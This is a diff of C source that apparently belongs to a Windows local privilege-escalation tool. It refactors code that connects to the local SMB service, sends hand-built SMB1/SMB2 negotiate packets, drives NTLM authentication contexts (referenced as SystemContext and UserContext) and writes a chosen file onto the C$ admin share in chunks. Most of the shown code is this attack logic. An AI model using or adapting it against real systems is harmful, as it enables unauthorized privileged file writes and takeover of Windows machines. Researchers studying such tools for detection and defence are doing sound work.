@@ -11,49 +11,45 @@
 
 #define CHUNK_SIZE 10000
 
+// global vars
 extern wchar_t* destfname;
 extern wchar_t* inputfname;
-// global vars
 extern HANDLE event1;
 extern HANDLE event2;
 extern HANDLE event3;
 extern char SystemContext[];
 extern char UserContext[];
 
-BOOL DoAuthenticatedFileWriteSMB(SOCKET s);
-BOOL DoAuthenticatedGenFileWriteSMB(SOCKET s, wchar_t*, wchar_t*,wchar_t *);
+BOOL DoAuthenticatedFileWriteSMB(SOCKET s, wchar_t*, wchar_t*,wchar_t *);
 SOCKET ConnectSocket(const wchar_t* ipAddress, int port);
 BOOL GenClientContext(BYTE* pIn, DWORD cbIn, BYTE* pOut, DWORD* pcbOut, BOOL* pfDone, WCHAR* pszTarget, CredHandle* hCred, struct _SecHandle* hcText);
 int findNTLMBytes(char* bytes, int len);
+BOOL SMBNegoProtocol(SOCKET s, char* recBuffer);
+BOOL SMB2NegoProtocol(SOCKET s);
+
 
 void SMBAuthenticatedFileWrite()
 {
     SOCKET smbSocket = ConnectSocket(L"127.0.0.1", 445);
-    //DoAuthenticatedFileWriteSMB(smbSocket);
-    DoAuthenticatedGenFileWriteSMB(smbSocket, (wchar_t*)L"\\\\127.0.0.1\\c$", (wchar_t*)destfname, (wchar_t *)inputfname);
+    DoAuthenticatedFileWriteSMB(smbSocket, (wchar_t*)L"\\\\127.0.0.1\\c$", (wchar_t*)destfname, (wchar_t *)inputfname);
     closesocket(smbSocket);
 }
 
 
-BOOL DoAuthenticatedGenFileWriteSMB(SOCKET s, wchar_t* path, wchar_t* fname, wchar_t *infile)
+BOOL DoAuthenticatedFileWriteSMB(SOCKET s, wchar_t* path, wchar_t* fname, wchar_t *infile)
 {
     BOOL fDone = FALSE;
     DWORD cbOut = 0;
     DWORD cbIn = 0;
-    PBYTE pInBuf;
     PBYTE pOutBuf;
-    myint mpid,mlen;
+    myint mpid;
     myshort slen;
     CredHandle hCred;
     struct _SecHandle  hcText;
-    unsigned char* tree_connect_path;
-    char mega[20000];
-    unsigned char smb_nego_protocol[] = \
-        "\x00\x00\x00\x45\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x01\x48" \
-        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xac\x7b" \
-        "\x00\x00\x00\x00\x00\x22\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e" \
-        "\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e\x30\x30\x32\x00\x02\x53" \
-        "\x4d\x42\x20\x32\x2e\x3f\x3f\x3f\x00";
+    char recBuffer[DEFAULT_BUFLEN];
+
+
+    SMBNegoProtocol(s, recBuffer);
 
     unsigned char smb2_nego_protocol[] = \
         "\x00\x00\x00\x68\xfe\x53\x4d\x42\x40\x00\x01\x00\x00\x00\x00\x00" \
@@ -67,18 +63,13 @@ BOOL DoAuthenticatedGenFileWriteSMB(SOCKET s, wchar_t* path, wchar_t* fname, wch
     
     usmb2_header s2h;
     usmb2_data s2d;
-    char recBuffer[DEFAULT_BUFLEN];
 
-    pInBuf = (PBYTE)malloc(DEFAULT_BUFLEN);
     pOutBuf = (PBYTE)malloc(DEFAULT_BUFLEN);
 
     int pid = GetCurrentProcessId();
-
     mpid.i = pid;
-    myshort ms, datalen;
-    ms.i = pid;
+    myshort datalen;
 
-    memcpy(&smb_nego_protocol[30], ms.buffer, 2);
     memcpy(&smb2_nego_protocol[36], mpid.buffer, 4);
 
     cbOut = DEFAULT_BUFLEN;
@@ -93,14 +84,8 @@ BOOL DoAuthenticatedGenFileWriteSMB(SOCKET s, wchar_t* path, wchar_t* fname, wch
     int plen = 0;
     unsigned char sessid[8];
     int MessageID=2;
-    memcpy(slen.buffer, &smb_nego_protocol[2], 2);
 
-    char c = smb_nego_protocol[3];
-    len = send(s, (char*)smb_nego_protocol, c + 4, 0);
-
-    len = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
-
-    c = smb2_nego_protocol[3];
+    char c = smb2_nego_protocol[3];
     len = send(s, (char*)smb2_nego_protocol, c + 4, 0);
 
     len = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
@@ -417,7 +402,6 @@ BOOL DoAuthenticatedGenFileWriteSMB(SOCKET s, wchar_t* path, wchar_t* fname, wch
     while ((nread = fread(chunk, 1, CHUNK_SIZE, fp)) > 0) {
         s2h.smb2_header.MessageID = MessageID++;// , "\x08\x00\x00\x00\x00\x00\x00\x00", 8);
         slen.i =sizeof(s2h.buffer) + sizeof(write_req) + nread;
-        //printf("mlen=%d %0x %d %d nread%d %d\n", slen.i,slen.i, MessageID, sizeof(write_data2),nread,sizeof(long long));
         memset(netsess, 0, 4);
         netsess[3] = slen.buffer[0];
         netsess[2] = slen.buffer[1];
@@ -497,7 +481,6 @@ BOOL DoAuthenticatedGenFileWriteSMB(SOCKET s, wchar_t* path, wchar_t* fname, wch
     len = send(s, (char*)InBuffer, sizeof(s2h.buffer) + 3, 0);
     len = send(s, (char*)tree_disconnect, sizeof(tree_disconnect), 0);
 
-    free(pInBuf);
     free(pOutBuf);
     return(TRUE);
 }
@@ -599,8 +582,6 @@ SOCKET ConnectSocket(const wchar_t* ipAddress, int port) {
 int findNTLMBytes(char* bytes, int len)
 {
     //Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.
-    //The NTLM bytes (for our purposes) are always at the end of the packet, so when we find the header,
-    //we can just return the index
     char pattern[7] = { 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50 };
     int pIdx = 0;
     int i;
@@ -614,4 +595,27 @@ int findNTLMBytes(char* bytes, int len)
         }
     }
     return -1;
+}
+
+BOOL SMBNegoProtocol(SOCKET s, char* recBuffer) {
+    BOOL ret = TRUE;
+    myshort slen;
+    int len = 0, pid = 0;
+    myshort ms;
+
+    unsigned char smb_nego_protocol[] = \
+        "\x00\x00\x00\x45\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x01\x48" \
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xac\x7b" \
+        "\x00\x00\x00\x00\x00\x22\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e" \
+        "\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e\x30\x30\x32\x00\x02\x53" \
+        "\x4d\x42\x20\x32\x2e\x3f\x3f\x3f\x00";
+
+    pid = GetCurrentProcessId();
+    ms.i = pid;
+    memcpy(&smb_nego_protocol[30], ms.buffer, 2);
+    memcpy(slen.buffer, &smb_nego_protocol[2], 2);
+    char c = smb_nego_protocol[3];
+    len = send(s, (char*)smb_nego_protocol, c + 4, 0);
+    len = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
+    return ret;
 }
